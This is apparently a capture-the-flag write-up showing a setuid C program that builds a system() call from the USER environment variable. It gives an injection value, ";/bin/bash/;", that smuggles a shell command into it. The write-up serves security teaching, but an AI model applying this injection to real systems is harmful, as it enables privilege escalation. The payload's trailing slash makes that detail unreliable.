# level02

## Challenge info


There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

```
int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```
## Solution

Vulnerability at line since we can control the buffer that will be executed by the system function with the environment variable $USER</br>

```
asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
```


Can be exploited by changing the env variable USER like:
```
export USER=";/bin/bash/;"
```

Now execute the level
```
./flag02
getflag
```

## flag

```
You have successfully executed getflag on a target account 
```
